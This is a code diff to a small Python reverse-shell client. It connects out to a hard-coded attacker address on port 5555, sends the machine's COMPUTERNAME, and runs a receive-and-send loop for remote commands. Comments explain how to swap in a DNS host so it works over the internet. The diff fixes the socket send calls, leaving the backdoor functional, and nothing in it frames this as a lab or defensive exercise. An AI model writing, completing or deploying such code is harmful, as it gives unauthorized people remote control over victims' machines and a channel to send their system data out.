@@ -6,14 +6,15 @@ def connect():
     global s 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
     port = 5555
-    host = ('10.8.101.56')#localIP in case your testing inside your network
+    host = ('10.8.101.56')
+    #localIP in case your testing inside your network
     #host = socket.gethostbyname('YOURDNSHOSTHERE')
     #here you could insert a DNS host and then use it to connect over WAN.
     try:
         print ('[!] Trying to connect to %s:%s'%(host,port))
         s.connect((host,port))
         print ('[*] Connection estabilished.')
-        s.sendfile(os.environ['COMPUTERNAME'])
+        s.send(os.environ['COMPUTERNAME'])
     except:
         print ('Could not connect.')
 def receive():
@@ -28,7 +29,7 @@ def receive():
         args = ('no valid input was given.')
     send(args)
 def send(args):
-    send = s.sendfile(args)
+    send = s.send(args)
     receive()
 connect()
 receive()
